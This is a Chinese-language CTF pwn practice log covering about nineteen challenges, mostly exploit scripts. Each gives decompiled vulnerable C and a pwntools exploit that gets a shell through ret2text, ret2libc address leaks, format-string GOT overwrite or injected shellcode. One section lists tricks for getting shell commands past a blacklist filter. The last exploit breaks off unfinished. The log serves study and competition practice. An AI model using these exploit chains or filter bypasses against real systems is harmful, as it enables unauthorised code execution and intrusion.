# CTF-Pwn刷题记录

**Pwn题做得还是太少了，希望真的能做到每日一Pwn吧@_@**

&lt;!--more--&gt;

## CTFHUB——ret2text

```python
from pwn import *
host = &#39;challenge-6d9543332f6f24b5.sandbox.ctfhub.com&#39;
port = 33376
#io = process(&#34;./pwn&#34;)
io = connect(host, port)
payload = &#39;A&#39; * 0x78 &#43; p64(0x4007b8)
io.sendline(payload)
io.interactive()
```



## [SWPUCTF 2021 新生赛]nc签到

```python
blacklist = [&#39;cat&#39;,&#39;ls&#39;,&#39; &#39;,&#39;cd&#39;,&#39;echo&#39;,&#39;&lt;&#39;,&#39;${IFS}&#39;]
#IFS表示 Internal Field Separator （内部字段分隔符）
while True:
    command = input()
    for i in blacklist:
        if i in command:
            exit(0)
    os.system(command)
```

下载附件，得到一个py文本文件，发现过滤了好多命令

法1、nc上后直接su提权，然后cat flag

法2、使用引号截断：l&#39;s&#39;	c&#39;at&#39;$IFS$9flag

法3、使用tac绕过cat过滤（tac是从最后一行倒序显示内容，并将所有内容输出）

```python
from pwn import * 
p = remote(&#34;1.14.71.254&#34;,28082)
p.sendline(&#34;tac$IFS$9flag&#34;)
print(p.recv())
p.interactive()
```

```bash
#Linux下绕过空格过滤的方法：
#cat flag.txt
cat${IFS}flag.txt
#${IFS} 对应 内部字段分隔符
cat$IFS$9flag.txt
#${9} 对应 空字符串
cat&lt;flag.txt
cat&lt;&gt;flag.txt
kg=$&#39;\x20flag.txt&#39;&amp;&amp;cat$kg
#${PS2} 对应字符 &#39;&gt;&#39;
#${PS4} 对应字符 &#39;&#43;&#39;
```

```bash
#Windows下绕过空格过滤的方法：
（实用性不是很广，也就type这个命令可以用）
type.\flag.txt
type,flag.txt
echo,123456
```

## [SWPUCTF 2021 新生赛]gift_pwn

有system(&#34;/bin/sh&#34;)的ret2text

```python
from pwn import *
#context(log_level=&#39;debug&#39;,arch=&#39;i386&#39;, os=&#39;linux&#39;)
context(log_level=&#39;debug&#39;, arch=&#39;amd64&#39;, os=&#39;linux&#39;)
#pwnfile= &#39;./question_4_3_x86&#39;
#io = process(pwnfile)
io = remote(&#39;1.14.71.254&#39;, 28707)
# elf = ELF(pwnfile)
# rop = ROP(pwnfile)

padding = 0x18
#debug
&#34;&#34;&#34; gdb.attach(io)
pause() &#34;&#34;&#34;
&#34;&#34;&#34;leak_func_name =&#39;write&#39;  
leak_func_got = elf.got[leak_func_name]
return_addr = elf.symbols[&#39;dofunc&#39;]&#34;&#34;&#34;
sh_addr = 0x4005B6
payload = b&#39;a&#39; * padding &#43; p64(sh_addr)

#payload = flat([&#39;a&#39;*padding, return_addr])
#payload = flat([cyclic(padding), return_addr,sh_addr])
# delimiter = &#39;&#39;
# io.sendlineafter(delimiter, payload)
io.sendline(payload)
io.interactive()
```

## [CISCN 2019华北]PWN1

```c
int func()
{
  char v1[44]; // [rsp&#43;0h] [rbp-30h] BYREF
  float v2; // [rsp&#43;2Ch] [rbp-4h]

  v2 = 0.0;
  puts(&#34;Let&#39;s guess the number.&#34;);
  gets(v1);
  if ( v2 == 11.28125 )
    return system(&#34;cat /flag&#34;);
  else
    return puts(&#34;Its value should be 11.28125&#34;);
}
```

法1、

也就是说只要通过栈溢出把v2的值覆盖为11.28125就可以得到flag

因为这里是浮点数，要先转换为16进制（0x41348000），然而float类型的长度是四字节，

所以不能用p64,要用p32发送

```python
from pwn import *
#context(log_level=&#39;debug&#39;,arch=&#39;i386&#39;, os=&#39;linux&#39;)
context(log_level=&#39;debug&#39;, arch=&#39;amd64&#39;, os=&#39;linux&#39;)
#pwnfile= &#39;./question_4_3_x86&#39;
#io = process(pwnfile)
io = remote(&#39;1.14.71.254&#39;, 28146)
# elf = ELF(pwnfile)
# rop = ROP(pwnfile)

padding = 0x30 - 0x4
#debug
&#34;&#34;&#34; gdb.attach(io)
pause() &#34;&#34;&#34;
&#34;&#34;&#34;leak_func_name =&#39;write&#39;  
leak_func_got = elf.got[leak_func_name]
return_addr = elf.symbols[&#39;dofunc&#39;]&#34;&#34;&#34;
sh_addr = 0x4005B6
v2 = 0x41348000
payload = b&#39;a&#39; * padding &#43; p32(v2)

#payload = flat([&#39;a&#39;*padding, return_addr])
#payload = flat([cyclic(padding), return_addr,sh_addr])
delimiter = &#34;Let&#39;s guess the number.\n&#34;
io.sendlineafter(delimiter, payload)
# io.sendline(payload)
io.interactive()
```

## ret2text-cyclic

```python
# -*- coding: UTF-8 -*-
from pwn import *

io = process(&#39;./ret2text&#39;)
binsh_addr = 0x804863A
payload = b&#39;a&#39; * 112 &#43; p32(binsh_addr)
delimiter = &#39;There is something amazing here, do you know anything?&#39;
io.sendafter(delimiter, payload)
io.interactive()
```

## 攻防世界pwn-200

ret2libc_x86

开了栈不可执行保护

所以思路是把‘/bin/sh’写入bss段然后执行

通过write和read函数泄露libc的地址

```c
ssize_t sub_8048484()
{
  char buf[108]; // [esp&#43;1Ch] [ebp-6Ch] BYREF

  setbuf(stdin, buf);
  return read(0, buf, 0x100u);
}
```

法1、

python exp.py pwn

```python
# -*- coding: UTF-8 -*-
import sys
from pwn import *

context(log_level=&#39;debug&#39;, arch=&#39;i386&#39;, os=&#39;linux&#39;)
#context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;, os=&#39;linux&#39;)
pwnfile = &#39;./pwn200&#39;
#通过sys.argv来确定打本地还是打远程
if len(sys.argv) &lt; 2:
    io = process(pwnfile)
else:
    io = remote(&#39;61.147.171.105&#39;, 50890)
elf = ELF(pwnfile)
rop = ROP(pwnfile)

#以调试的模式运行程序
&#34;&#34;&#34; gdb.attach(io)
pause() &#34;&#34;&#34;
start_addr = 0x080483d0
func_addr = 0x08048484
padding = 0x70
delimiter = &#39;Welcome to XDCTF2015~!&#39;
write_plt = elf.symbols[&#39;write&#39;]#自动获取write函数的地址
read_plt = elf.symbols[&#39;read&#39;]


def leak(address):
    #泄露地址的板子
    payload = flat([b&#39;a&#39; * padding, write_plt, func_addr, 1, address, 4])
    #write函数和read函数都有三个参数，第三个参数代表字节长度
    io.sendline(payload)
    # io.sendlineafter(delimiter,payload)
    data = io.recv(4)
    print(data)
    return data


print(io.recv())
dyn = DynELF(leak, elf=ELF(pwnfile))
sys_addr = dyn.lookup(&#34;system&#34;, &#39;libc&#39;)
#自动获取泄露出来的libc中system函数的地址
print(&#34;system address:&#34;, hex(sys_addr))
payload1 = flat([b&#39;a&#39; * padding, start_addr])
# io.sendlineafter(delimiter,payload1)
# #调用start函数恢复栈
io.sendline(payload1)
io.recv()

ppp_addr = 0x0804856c
#这里是pop三次是栈指针指向system函数
bss_addr = elf.bss()
payload2 = flat([
    b&#39;a&#39; * padding, read_plt, ppp_addr, 0, bss_addr, 8, sys_addr, func_addr,
    bss_addr
])
#payload = b&#39;a&#39; * padding &#43; p32(return_addr) &#43; p32(sh_addr)
io.sendline(payload2)
io.send(&#39;/bin/sh&#39;)
io.interactive()
```

法2、

```python
# -*- coding: UTF-8 -*-
import sys
from pwn import *

context(log_level=&#39;debug&#39;, arch=&#39;i386&#39;, os=&#39;linux&#39;)
#context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;, os=&#39;linux&#39;)
pwnfile = &#39;./pwn200&#39;
if len(sys.argv) &lt; 2:
    io = process(pwnfile)
else:
    io = remote(&#39;61.147.171.105&#39;, 50890)
elf = ELF(pwnfile)
rop = ROP(pwnfile)

#以调试的模式运行程序
&#34;&#34;&#34; gdb.attach(io)
pause() &#34;&#34;&#34;
start_addr = 0x080483d0
func_addr = 0x08048484
bss_addr = 0x804A048
#使用bss结尾处的内存区域，read之后跳转到start，程序会再次修改stdin和stdout的值
padding = 0x70
delimiter = &#39;Welcome to XDCTF2015~!\n&#39;
write_plt = elf.symbols[&#39;write&#39;]
read_plt = elf.symbols[&#39;read&#39;]


def leak(address):
    payload = flat([b&#39;a&#39; * padding, write_plt, start_addr, 1, address, 4])
    # io.sendline(payload)
    io.sendlineafter(delimiter, payload)
    data = io.recv(4)
    print(data)
    return data


dyn = DynELF(leak, elf=ELF(pwnfile))
sys_addr = dyn.lookup(&#34;system&#34;, &#39;libc&#39;)
print(&#34;system address:&#34;, hex(sys_addr))

payload1 = flat([b&#39;a&#39; * padding, read_plt, start_addr, 0, bss_addr, 8])

io.sendlineafter(delimiter, payload1)
io.sendline(&#39;/bin/sh&#39;)
payload2 = flat([b&#39;a&#39; * padding, sys_addr, 0xdeadbeef, bss_addr])
#此时bss_addr上的值还是&#39;/bin/sh&#39;
io.sendlineafter(delimiter, payload2)
io.interactive()

```

## [SWPUCTF 2021 新生赛]whitegive_pwn（ret2libc_本地libc）

```c
__int64 vuln()
{
  char v1[16]; // [rsp&#43;0h] [rbp-10h] BYREF
  return gets(v1);
}
```

```python
# -*- coding: UTF-8 -*-
import sys
from pwn import *
# context(log_level=&#39;debug&#39;, arch=&#39;i386&#39;, os=&#39;linux&#39;)
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;, os=&#39;linux&#39;)
libc = ELF(&#39;./libc-2.23.so&#39;)
pwnfile = &#39;./1&#39;
if len(sys.argv) &lt; 2:
    io = process(pwnfile)
else:
    io = remote(&#39;1.14.71.254&#39;,28930)
elf = ELF(pwnfile)
rop = ROP(pwnfile)
 
#以调试的模式运行程序
#gdb.attach(io)
#pause()
main_addr = 0x4006D6
pop_rdi_ret_addr=0x0000000000400763
ret_addr = 0x0000000000400509
# exit_addr = 0x08048558
puts_plt=elf.plt[&#39;puts&#39;]
puts_got=elf.got[&#39;puts&#39;]

padding = 0x10&#43;0x8
payload = flat([b&#39;a&#39;*padding,pop_rdi_ret_addr,puts_got,puts_plt,main_addr])
io.sendline(payload)
puts_addr = u64(io.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))
print(&#34;puts_addr is : &#34;&#43;hex(puts_addr))
libc_base = puts_addr-libc.symbols[&#39;puts&#39;]
system_addr = libc_base &#43; libc.symbols[&#39;system&#39;]
binsh_addr = libc_base&#43;next(libc.search(b&#39;/bin/sh&#39;))
# print(hex(next(libc.search(b&#39;/bin/sh&#39;))))
# next() 返回迭代器的下一个项目
payload2 = flat([b&#39;a&#39;*padding,ret_addr,pop_rdi_ret_addr,binsh_addr,system_addr])
io.sendline(payload2)
io.interactive()
```

## ciscn_2019_n_8

```c&#43;&#43;
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp-14h] [ebp-20h]
  int v5; // [esp-10h] [ebp-1Ch]

  var[13] = 0;
  var[14] = 0;
  init();
  puts(&#34;What&#39;s your name?&#34;);
  __isoc99_scanf(&#34;%s&#34;, var, v4, v5);
  if ( *(_QWORD *)&amp;var[13] )
  {
    if ( *(_QWORD *)&amp;var[13] == 17LL )
      system(&#34;/bin/sh&#34;);
    else
      printf(
        &#34;something wrong! val is %d&#34;,
        var[0],
        var[1],
        var[2],
        var[3],
        var[4],
        var[5],
        var[6],
        var[7],
        var[8],
        var[9],
        var[10],
        var[11],
        var[12],
        var[13],
        var[14]);
  }
  else
  {
    printf(&#34;%s, Welcome!\n&#34;, var);
    puts(&#34;Try do something~&#34;);
  }
  return 0;
}
```

经过观察可以发现只要使var[13]==17即可触发/bin/sh

只需连续输入14个17就可使var[13]==17

```python
# -*- coding: UTF-8 -*-
import sys
from pwn import *

context(log_level=&#39;debug&#39;, arch=&#39;i386&#39;, os=&#39;linux&#39;)
#context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;, os=&#39;linux&#39;)

io = remote(&#39;node4.buuoj.cn&#39;,27987)
# io = process(&#39;./ciscn_2019_n_8&#39;)
payload = p32(0x11) * 14
#payload = p32(17) * 14
io.sendline(payload)
io.interactive()
```

## bjdctf_2020_babystack

有system(&#39;/bin/sh&#39;)的简单的ret2text

```python
# -*- coding: UTF-8 -*-
import sys
from pwn import *

# context(log_level=&#39;debug&#39;, arch=&#39;i386&#39;, os=&#39;linux&#39;)
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;, os=&#39;linux&#39;)
pwnfile = &#39;./bjdctf_2020_babystack&#39;
if len(sys.argv) &lt; 2:
    io = process(pwnfile)
else:
    io = remote(&#39;node4.buuoj.cn&#39;, 29341)
elf = ELF(pwnfile)
rop = ROP(pwnfile)

#以调试的模式运行程序
# gdb.attach(io)
# pause()
ret_addr=0x400561
sys_addr=0x4006E6

payload=flat([b&#39;a&#39;*0x18,ret_addr,sys_addr])
io.sendlineafter(b&#39;name:\n&#39;,b&#39;-1&#39;)
io.sendlineafter(b&#39;name?\n&#39;,payload)
io.interactive()
```

## GeekChallenge——pwn2_1

```python
from pwntools import *

init(&#34;./pwn2_1&#34;)

payload = b&#34;\x00&#34;*0x10 &#43; b&#34;woodwood&#34; &#43; p64(0x4011EF)
sl(payload)
ia()
```

## 2017-UIUCTF-pwn200 GoodLuck(fmtstr_x64)

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [rsp&#43;3h] [rbp-3Dh]
  int i; // [rsp&#43;4h] [rbp-3Ch]
  int j; // [rsp&#43;4h] [rbp-3Ch]
  char *format; // [rsp&#43;8h] [rbp-38h] BYREF
  _IO_FILE *fp; // [rsp&#43;10h] [rbp-30h]
  char *v9; // [rsp&#43;18h] [rbp-28h]
  char v10[24]; // [rsp&#43;20h] [rbp-20h] BYREF
  unsigned __int64 v11; // [rsp&#43;38h] [rbp-8h]

  v11 = __readfsqword(0x28u);
  fp = fopen(&#34;flag.txt&#34;, &#34;r&#34;);
  for ( i = 0; i &lt;= 21; &#43;&#43;i )
    v10[i] = gets(fp);
  fclose(fp);
  v9 = v10;
  puts(&#34;what&#39;s the flag&#34;);
  fflush(_bss_start);
  format = 0LL;
  __isoc99_scanf(&#34;%ms&#34;, &amp;format);
  for ( j = 0; j &lt;= 21; &#43;&#43;j )
  {
    v4 = format[j];
    if ( !v4 || v10[j] != v4 )
    {
      puts(&#34;You answered:&#34;);
      printf(format);
      puts(&#34;\nBut that was totally wrong lol get rekt&#34;);
      fflush(_bss_start);
      return 0;
    }
  }
  printf(&#34;That&#39;s right, the flag is %s\n&#34;, v9);
  fflush(_bss_start);
  return 0;
}
```

**exp**

```python
from pwn import *
from LibcSearcher import *
goodluck = ELF(&#39;./goodluck&#39;)
if args[&#39;REMOTE&#39;]:
    sh = remote(&#39;pwn.sniperoj.cn&#39;, 30017)
else:
    sh = process(&#39;./goodluck&#39;)
payload = b&#34;%9$s&#34;
print (payload)
##gdb.attach(sh)
print (sh.recv())
sh.sendline(payload)
print (sh.recv())
# sh.interactive()
```

## 2016-CCTF-pwn3(fmtstr)(有问题)

```c
int get_file()
{
  char dest[200]; // [esp&#43;1Ch] [ebp-FCh] BYREF
  char s1[40]; // [esp&#43;E4h] [ebp-34h] BYREF
  char *i; // [esp&#43;10Ch] [ebp-Ch]

  printf(&#34;enter the file name you want to get:&#34;);
  __isoc99_scanf(&#34;%40s&#34;, s1);
  if ( !strncmp(s1, &#34;flag&#34;, 4u) )
    puts(&#34;too young, too simple&#34;);
  for ( i = (char *)file_head; i; i = (char *)*((_DWORD *)i &#43; 60) )
  {
    if ( !strcmp(i, s1) )
    {
      strcpy(dest, i &#43; 40);
      return printf(dest);
    }
  }
  return printf(dest);
}
```

**exp**

```python
from pwn import *
from LibcSearcher import LibcSearcher
##context.log_level = &#39;debug&#39;
pwn3 = ELF(&#39;./pwn3&#39;)
if args[&#39;REMOTE&#39;]:
    sh = remote(&#39;111&#39;, 111)
else:
    sh = process(&#39;./pwn3&#39;)


def get(name):
    sh.sendline(&#39;get&#39;)
    sh.recvuntil(&#39;enter the file name you want to get:&#39;)
    sh.sendline(name)
    data = sh.recv()
    return data


def put(name, content):
    sh.sendline(&#39;put&#39;)
    sh.recvuntil(&#39;please enter the name of the file you want to upload:&#39;)
    sh.sendline(name)
    sh.recvuntil(&#39;then, enter the content:&#39;)
    sh.sendline(content)


def show_dir():
    sh.sendline(&#39;dir&#39;)


tmp = &#39;sysbdmin&#39;
name = &#34;&#34;
for i in tmp:
    name &#43;= chr(ord(i) - 1)


## password
def password():
    sh.recvuntil(&#39;Name (ftp.hacker.server:Rainism):&#39;)
    sh.sendline(name)


##password
password()
## get the addr of puts
puts_got = pwn3.got[&#39;puts&#39;]
log.success(&#39;puts got : &#39; &#43; hex(puts_got))
put(&#39;1111&#39;, &#39;%8$s&#39; &#43; p32(puts_got))
puts_addr = u32(get(&#39;1111&#39;)[:4])

## get addr of system
libc = LibcSearcher(&#34;puts&#34;, puts_addr)
system_offset = libc.dump(&#39;system&#39;)
puts_offset = libc.dump(&#39;puts&#39;)
system_addr = puts_addr - puts_offset &#43; system_offset
log.success(&#39;system addr : &#39; &#43; hex(system_addr))

## modify puts@got, point to system_addr
payload = fmtstr_payload(7, {puts_got: system_addr})
put(&#39;/bin/sh;&#39;, payload)
sh.recvuntil(&#39;ftp&gt;&#39;)
sh.sendline(&#39;get&#39;)
sh.recvuntil(&#39;enter the file name you want to get:&#39;)
##gdb.attach(sh)
sh.sendline(&#39;/bin/sh;&#39;)

## system(&#39;/bin/sh&#39;)
show_dir()
sh.interactive()
```

## BUUO-Jciscn_2019_c_1(ret2libc)

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp&#43;Ch] [rbp-4h] BYREF

  init(argc, argv, envp);//清空缓冲区
  puts(&#34;EEEEEEE                            hh      iii                &#34;);
  puts(&#34;EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  &#34;);
  puts(&#34;EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e &#34;);
  puts(&#34;EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  &#34;);
  puts(&#34;EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee &#34;);
  puts(&#34;====================================================================&#34;);
  puts(&#34;Welcome to this Encryption machine\n&#34;);
  begin();//表单初始化
  while ( 1 )
  {
    while ( 1 )
    {
      fflush(0LL);
      v4 = 0;
      __isoc99_scanf(&#34;%d&#34;, &amp;v4);
      getchar();
      if ( v4 != 2 )
        break;
      puts(&#34;I think you can do it by yourself&#34;);
      begin();
    }
    if ( v4 == 3 )
    {
      puts(&#34;Bye!&#34;);
      return 0;
    }
    if ( v4 != 1 )
      break;
    encrypt();//Vuln-ret2libc
    begin();
  }
  puts(&#34;Something Wrong!&#34;);
  return 0;
}
```

```c
int encrypt()
{
  size_t v0; // rbx
  char s[48]; // [rsp&#43;0h] [rbp-50h] BYREF
  __int16 v3; // [rsp&#43;30h] [rbp-20h]

  memset(s, 0, sizeof(s));
  v3 = 0;
  puts(&#34;Input your Plaintext to be encrypted&#34;);
  gets(s);//Stackoverflow
  while ( 1 )
  {
    v0 = (unsigned int)x;
    if ( v0 &gt;= strlen(s) )//利用b‘/x00’和strlen()绕过encrypt()
      break;
    if ( s[x] &lt;= 96 || s[x] &gt; 122 )
    {
      if ( s[x] &lt;= 64 || s[x] &gt; 90 )
      {
        if ( s[x] &gt; 47 &amp;&amp; s[x] &lt;= 57 )
          s[x] ^= 0xFu;
      }
      else
      {
        s[x] ^= 0xEu;
      }
    }
    else
    {
      s[x] ^= 0xDu;
    }
    &#43;&#43;x;
  }
  puts(&#34;Ciphertext&#34;);
  return puts(s);
}
```

**exp**

```python
# -*- coding: UTF-8 -*-
import sys
from pwn import *
from LibcSearcher import *
# context(log_level=&#39;debug&#39;, arch=&#39;i386&#39;, os=&#39;linux&#39;)
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;, os=&#39;linux&#39;)
pwnfile = &#39;./0&#39;
if len(sys.argv) &lt; 2:
    io = process(pwnfile)
else:
    io = remote(&#39;node4.buuoj.cn&#39;, 25164)
elf = ELF(pwnfile)
rop = ROP(pwnfile)
 
#以调试的模式运行程序
#gdb.attach(io)
#pause()
# 本地换多个版本libc打
# libc = ELF(&#39;./libc-2.27.so&#39;)
# libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)

puts_plt = elf.plt[&#39;puts&#39;]
#用puts函数plt表的地址调用puts函数
puts_got = elf.got[&#39;puts&#39;]
main_addr=elf.symbols[&#39;main&#39;]

pop_rdi_ret = 0x400c83
ret_addr = 0x4006b9
io.recvline()
io.sendline(&#39;1&#39;)
padding = 0x58
payload = flat([b&#39;a&#39; * padding, pop_rdi_ret, puts_got, puts_plt, main_addr])
io.recvline()
io.sendline(payload)
io.recvline()
io.recvline()
puts_addr = u64(io.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))
# puts_addr = u64(io.recvuntil(&#39;\n&#39;,drop=True).ljust(8,b&#39;\x00&#39;))
#从0x7F（这一行末尾）往前截取六字节，然后用\x00补全八字节
#截取低三位，分页机制导致libc后三位恒不变，加以区分。
libc=LibcSearcher(&#39;puts&#39;,puts_addr)
libc_base = puts_addr - libc.dump(&#39;puts&#39;)
sys_addr=libc_base&#43;libc.dump(&#39;system&#39;)
binsh_addr=libc_base&#43;libc.dump(&#39;str_bin_sh&#39;)
# 本地libc计算相应内存地址。
# libc_base = puts_addr - libc.symbols[&#39;puts&#39;]
# system_addr = libc_base &#43; libc.symbols[&#39;system&#39;]
# binsh_addr = libc_base &#43; libc.search(&#39;/bin/sh&#39;).next()

io.recvline()
io.sendline(b&#39;1&#39;)
payload2=flat([b&#39;0&#39;,b&#39;a&#39; * (padding-0x01), ret_addr,pop_rdi_ret, binsh_addr,sys_addr])
# 高版本libc加上ret来平衡堆栈
io.recv()
io.sendline(payload2)
io.interactive()
# 由于页对齐机制
# 4kb为一页
# 4kb=4*1024=2^12=0x1000
# 所有页都是这样对齐的, 所以在分配给动态链接库的时候
# 不会影响到低三字节
# 由此可以确定版本信息了
# 那种分配给动态链接库的内存, 也是n个页
# n*0x1000怎么样都不会影响低三字节的
```

## JarvisOj [XMAN]level-1(ret2shellcode)

```c
ssize_t vulnerable_function()
{
  char buf[136]; // [esp&#43;0h] [ebp-88h] BYREF
  printf(&#34;What&#39;s this:%p?\n&#34;, buf);
  return read(0, buf, 0x100u);
}
```

**exp**

```python
# -*- coding: UTF-8 -*-
import sys
from pwn import *
context(log_level=&#39;debug&#39;, arch=&#39;i386&#39;, os=&#39;linux&#39;)
#context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;, os=&#39;linux&#39;)
pwnfile = &#39;./2&#39;
if len(sys.argv) &lt; 2:
    io = process(pwnfile)
else:
    io = remote(&#34;pwn2.jarvisoj.com&#34;,9877)
elf = ELF(pwnfile)
rop = ROP(pwnfile)
 
#以调试的模式运行程序
#gdb.attach(io)
#pause()

shellcode = asm(shellcraft.i386.linux.sh())
line = io.recvline()[14:-2]
# print(line)
buf_addr = int(line,16)
# 将十六进制数转为十进制数
# print(buf_addr)
payload = shellcode &#43; b&#39;A&#39; * (0x88 &#43; 0x4 - len(shellcode)) &#43; p32(buf_addr)
io.send(payload)
io.interactive()
io.close()
```

## [watevrCTF 2019]Voting Machine 1（ret2text）

```python
# -*- coding: UTF-8 -*-
import sys
from pwn import *
# context(log_level=&#39;debug&#39;, arch=&#39;i386&#39;, os=&#39;linux&#39;)
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;, os=&#39;linux&#39;)
pwnfile = &#39;./1&#39;
if len(sys.argv) &lt; 2:
    io = process(pwnfile)
else:
    io = remote(&#39;1.14.71.254&#39;,28835)
elf = ELF(pwnfile)
rop = ROP(pwnfile)
 
#以调试的模式运行程序
#gdb.attach(io)
#pause()
 
# print(io.recv())
padding = 0xa
flag_addr=0x400807
payload = flat([b&#39;a&#39; * padding,flag_addr])
io.sendline(payload)
io.interactive()
```

## [2021 鹤城杯]babyof（ret2libc）

```c
int sub_400632()
{
  char buf[64]; // [rsp&#43;0h] [rbp-40h] BYREF

  puts(&#34;Do you know how to do buffer overflow?&#34;);
  read(0, buf, 0x100uLL);
  return puts(&#34;I hope you win&#34;);
}
```

```python
# -*- coding: UTF-8 -*-
import sys
from pwn import *
from LibcSearcher import *
# context(log_level=&#39;debug&#39;, arch=&#39;i386&#39;, os=&#39;linux&#39;)
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;, os=&#39;linux&#39;)
pwnfile = &#39;./2&#39;
if len(sys.argv) &lt; 2:
    io = process(pwnfile)
else:
    io = remote(&#39;1.14.71.254&#39;,28795)
elf = ELF(pwnfile)
rop = ROP(pwnfile)
 
#以调试的模式运行程序
#gdb.attach(io)
#pause()
 
ret_addr=0x0000000000400506
pop_rdi_ret_addr=0x0000000000400743
puts_plt=elf.plt[&#39;puts&#39;]
puts_got=elf.got[&#39;puts&#39;]
main_addr=0x40066B

padding = 0x40&#43;0x8


payload = flat([b&#39;a&#39; * padding,pop_rdi_ret_addr,puts_got,puts_plt,main_addr])
io.recv()
io.sendline(payload)
puts_addr=u64(io.recvuntil(&#34;\x7f&#34;)[-6:].ljust(8,b&#39;\x00&#39;))
print(hex(puts_addr))
libc=LibcSearcher(&#39;puts&#39;,puts_addr)
libc_base=puts_addr-libc.dump(&#39;puts&#39;)
sys_addr=libc_base&#43;libc.dump(&#39;system&#39;)
binsh_addr=libc_base&#43;libc.dump(&#39;str_bin_sh&#39;)

payload1 =flat([b&#39;a&#39; * padding,ret_addr,pop_rdi_ret_addr,binsh_addr,sys_addr])
io.recv()
io.sendline(payload1)
io.interactive()
```

## BUUOJ-ciscn_2019_en_2 / [CISCN 2019东北]PWN2（ret2libc_x64）

```c
int encrypt()
{
  size_t v0; // rbx
  char s[48]; // [rsp&#43;0h] [rbp-50h] BYREF
  __int16 v3; // [rsp&#43;30h] [rbp-20h]

  memset(s, 0, sizeof(s));
  v3 = 0;
  puts(&#34;Input your Plaintext to be encrypted&#34;);
  gets(s);
  while ( 1 )
  {
    v0 = (unsigned int)x;
    if ( v0 &gt;= strlen(s) )
      break;
    if ( s[x] &lt;= 96 || s[x] &gt; 122 )
    {
      if ( s[x] &lt;= 64 || s[x] &gt; 90 )
      {
        if ( s[x] &gt; 47 &amp;&amp; s[x] &lt;= 57 )
          s[x] ^= 0xCu;
      }
      else
      {
        s[x] ^= 0xDu;
      }
    }
    else
    {
      s[x] ^= 0xEu;
    }
    &#43;&#43;x;
  }
  puts(&#34;Ciphertext&#34;);
  return puts(s);
}
```

**exp**

```python
# -*- coding: UTF-8 -*-
import sys
from pwn import *
from LibcSearcher import *
# context(log_level=&#39;debug&#39;, arch=&#39;i386&#39;, os=&#39;linux&#39;)
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;, os=&#39;linux&#39;)
pwnfile = &#39;./3&#39;
if len(sys.argv) &lt; 2:
    io = process(pwnfile)
else:
    io = remote(&#39;1.14.71.254&#39;,28986)
elf = ELF(pwnfile)
rop = ROP(pwnfile)
 
#以调试的模式运行程序
#gdb.attach(io)
#pause()
 
ret_addr=0x00000000004006b9
pop_rdi_ret_addr=0x0000000000400c83
puts_plt=elf.plt[&#39;puts&#39;]
puts_got=elf.got[&#39;puts&#39;]
main_addr=0x400B28

padding = 0x50&#43;0x8

payload = flat([b&#39;\x00&#39;,b&#39;a&#39; * (padding-0x1),pop_rdi_ret_addr,puts_got,puts_plt,main_addr])
io.recv()
io.sendline(&#39;1&#39;)
io.recv()
io.sendline(payload)
puts_addr=u64(io.recvuntil(&#34;\x7f&#34;)[-6:].ljust(8,b&#39;\x00&#39;))
print(hex(puts_addr))
libc=LibcSearcher(&#39;puts&#39;,puts_addr)
libc_base=puts_addr-libc.dump(&#39;puts&#39;)
sys_addr=libc_base&#43;libc.dump(&#39;system&#39;)
binsh_addr=libc_base&#43;libc.dump(&#39;str_bin_sh&#39;)

payload1 =flat([b&#39;\x00&#39;,b&#39;a&#39; *(padding-0x1),ret_addr,pop_rdi_ret_addr,binsh_addr,sys_addr])
io.recv()
io.sendline(&#39;1&#39;)
io.recv()
io.sendline(payload1)
io.interactive()
```

## BUU[OGeek2019]babyrop（ret2libc_x86_本地libc）

```c
int __cdecl sub_804871F(int a1)
{
  size_t v1; // eax
  char s[32]; // [esp&#43;Ch] [ebp-4Ch] BYREF
  char buf[32]; // [esp&#43;2Ch] [ebp-2Ch] BYREF
  ssize_t v5; // [esp&#43;4Ch] [ebp-Ch]

  memset(s, 0, sizeof(s));
  memset(buf, 0, sizeof(buf));
  sprintf(s, &#34;%ld&#34;, a1);
  v5 = read(0, buf, 0x20u);
  buf[v5 - 1] = 0;//影响不到
  v1 = strlen(buf);
  if ( strncmp(buf, s, v1) )
    exit(0);
  write(1, &#34;Correct\n&#34;, 8u);
  return (unsigned __int8)buf[7];
}
```

```c
ssize_t __cdecl sub_80487D0(char a1)//上一个程序的buf[7]是a1
{
  char buf[231]; // [esp&#43;11h] [ebp-E7h] BYREF

  if ( a1 == 127 )
    return read(0, buf, 0xC8u);
  else
    return read(0, buf, a1);
    //这里有栈溢出漏洞
}
```

**exp**

```python
# -*- coding: UTF-8 -*-
import sys
from pwn import *
context(log_level=&#39;debug&#39;, arch=&#39;i386&#39;, os=&#39;linux&#39;)
#context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;, os=&#39;linux&#39;)
libc = ELF(&#39;./libc-2.23.so&#39;)
pwnfile = &#39;./0&#39;
if len(sys.argv) &lt; 2:
    io = process(pwnfile)
else:
    io = remote(&#39;node4.buuoj.cn&#39;,26127)
elf = ELF(pwnfile)
rop = ROP(pwnfile)
 
#以调试的模式运行程序
#gdb.attach(io)
#pause()
main_addr = 0x8048825
exit_addr = 0x08048558
write_plt=elf.plt[&#39;write&#39;]
write_got=elf.got[&#39;write&#39;]

payload1=flat([b&#39;\x00&#39;,b&#39;\xff&#39;*7])
io.sendline(payload1)
io.recv()
padding = 0xe7&#43;0x4
